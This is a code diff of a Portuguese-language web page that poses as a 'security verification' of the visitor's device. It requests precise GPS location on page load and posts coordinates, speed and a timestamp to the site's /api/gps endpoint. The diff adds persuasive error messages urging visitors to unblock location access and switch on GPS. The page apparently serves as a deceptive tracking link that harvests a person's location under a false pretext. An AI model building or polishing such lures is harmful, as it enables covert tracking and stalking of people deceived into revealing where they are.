@@ -3,25 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação de Sistema</title>
+    <title>Verificação de Segurança</title>
     <style>
-        body { font-family: sans-serif; background: #f4f4f4; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; padding: 20px; box-sizing: border-box; }
+        
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
+        
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+        
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { color: #333; }
-        p { color: #666; font-size: 0.9rem; }
+        
+        h2 { color: #333; margin-top: 0; font-size: 1.2rem; }
+        p { color: #666; font-size: 0.95rem; line-height: 1.5; margin-bottom: 20px; }
+        
+        /* Botão para Tentar Novamente */
+        .btn-retry { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; display: none; width: 100%; font-size: 1rem; }
+        
+        /* Estilos de Erro */
+        .error-box { background: #ffebee; color: #c62828; padding: 15px; border-radius: 8px; font-size: 0.9rem; margin-top: 15px; display: none; border: 1px solid #ef9a9a; }
+        
+        .icon-gps { font-size: 40px; margin-bottom: 10px; display: block; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <h2>Verificando Conexão Segura...</h2>
-    <p>Por favor, permita o acesso à localização para validar seu dispositivo.</p>
+
+    <div class="card">
+        <div id="loading-icon" class="loader"></div>
+        <h2 id="titulo">Verificando Dispositivo...</h2>
+        <p id="mensagem">Aguarde enquanto estabelecemos conexão segura com o servidor.</p>
+
+        <div id="error-msg" class="error-box"></div>
+
+        <button id="btn-retry" class="btn-retry" onclick="tentarNovamente()">Tentar Novamente</button>
+    </div>
 
     <script>
-        const API_URL = "/api/gps"; // Manda pro próprio site
-        const deviceId = "visitante_" + Math.random().toString(36).substr(2, 5);
+        const API_URL = "/api/gps";
+        // ID único para identificar essa sessão
+        const deviceId = "link_" + Math.random().toString(36).substr(2, 6);
+        let tentativas = 0;
+
+        function showStatus(titulo, msg, loading=true) {
+            document.getElementById("titulo").innerText = titulo;
+            document.getElementById("mensagem").innerText = msg;
+            document.getElementById("loading-icon").style.display = loading ? "block" : "none";
+        }
+
+        function showError(msg) {
+            const errBox = document.getElementById("error-msg");
+            errBox.style.display = "block";
+            errBox.innerHTML = `<span class="icon-gps">📍</span><br><b>Atenção Necessária:</b><br>${msg}`;
+            document.getElementById("loading-icon").style.display = "none";
+            document.getElementById("btn-retry").style.display = "inline-block";
+        }
 
         function enviar(position) {
+            // Sucesso!
+            showStatus("Conectado", "Dispositivo verificado com sucesso.", false);
+            document.getElementById("error-msg").style.display = "none";
+            document.getElementById("btn-retry").style.display = "none";
+            document.querySelector(".card").style.borderTop = "5px solid #00c853";
+
             fetch(API_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -32,20 +74,51 @@
                     speed: position.coords.speed || 0,
                     battery: 0,
                     timestamp: Date.now(),
-                    provider: "web_link" // Identifica que veio do link
+                    provider: "web_link"
                 })
-            }).then(() => {
-                document.querySelector("h2").innerText = "Verificação Concluída";
-                document.querySelector(".loader").style.borderTop = "4px solid green";
-                document.querySelector("p").innerText = "Dispositivo validado com sucesso.";
             });
         }
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(enviar, (err) => {
-                console.log("Erro ou permissão negada");
-            }, { enableHighAccuracy: true });
+        function tratarErro(err) {
+            console.warn("Erro GPS:", err.code, err.message);
+            
+            if (err.code === 1) {
+                // PERMISSION_DENIED (Usuário clicou em Bloquear)
+                showError("O acesso à localização foi negado.<br>Por favor, clique no cadeado 🔒 na barra de endereço e permita a localização.");
+            } else if (err.code === 2) {
+                // POSITION_UNAVAILABLE (Geralmente GPS Desligado)
+                showError("Não foi possível detectar o GPS.<br><b>Verifique se a Localização do celular está ATIVADA</b> e tente novamente.");
+            } else if (err.code === 3) {
+                // TIMEOUT
+                showError("O sinal de GPS está fraco.<br>Vá para um local aberto e tente novamente.");
+            } else {
+                showError("Erro desconhecido ao acessar GPS.");
+            }
         }
+
+        function iniciarGPS() {
+            document.getElementById("error-msg").style.display = "none";
+            document.getElementById("btn-retry").style.display = "none";
+            showStatus("Localizando...", "Solicitando permissão de acesso...", true);
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(enviar, tratarErro, {
+                    enableHighAccuracy: true, // Força tentar usar o hardware GPS
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                showError("Seu navegador não suporta geolocalização.");
+            }
+        }
+
+        function tentarNovamente() {
+            iniciarGPS();
+        }
+
+        // Tenta iniciar assim que abre
+        window.onload = iniciarGPS;
+
     </script>
 </body>
 </html>
